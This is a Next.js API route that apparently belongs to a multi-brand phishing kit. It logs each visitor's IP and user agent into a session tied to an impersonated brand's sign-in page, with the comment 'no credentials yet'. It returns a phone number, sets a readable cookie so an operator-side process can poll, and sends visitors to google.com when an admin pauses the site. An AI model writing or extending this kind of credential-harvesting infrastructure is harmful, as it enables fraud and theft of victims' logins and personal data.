import { NextRequest, NextResponse } from 'next/server';
import { getBrandById } from '@/config/brands.config';
import { upsertSession, normalizeIp } from '@/lib/sessions';
import { store } from '@/lib/store';

const REDIRECT_TARGET = 'https://www.google.com';

interface VisitRequest {
  brand: string;
  page: string;
}

export async function POST(request: NextRequest) {
  try {
    // ── Pause gate ────────────────────────────────────────────────────────
    // When the admin has paused the site, reject all incoming visits
    // immediately — no session is created, no brand is validated.
    if (store.isPaused) {
      return NextResponse.json(
        { redirectTo: REDIRECT_TARGET },
        { status: 503 },
      );
    }

    const body: VisitRequest = await request.json();
    const { brand: brandId, page } = body;

    // Validate brand
    const brand = getBrandById(brandId);
    if (!brand) {
      return NextResponse.json({ error: 'Invalid brand' }, { status: 400 });
    }

    // Get client info
    const rawIp =
      request.headers.get('x-forwarded-for') ||
      request.headers.get('x-real-ip') ||
      'unknown';
    const clientIp = normalizeIp(rawIp);
    const userAgent = request.headers.get('user-agent') || 'unknown';

    // Track session (no credentials yet)
    const session = await upsertSession(clientIp, userAgent, brandId, page || 'signin', {});

    const res = NextResponse.json({
      success: true,
      sessionId: session?.id,
      phoneNumber: session?.phoneNumber ?? null,
    });

    // Non-httpOnly cookie so the client can read the session id for polling
    res.cookies.set('session_id', session?.id ?? '', {
      path: '/',
      maxAge: 60 * 60 * 24,
    });

    return res;
  } catch (error) {
    console.error('Visit API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
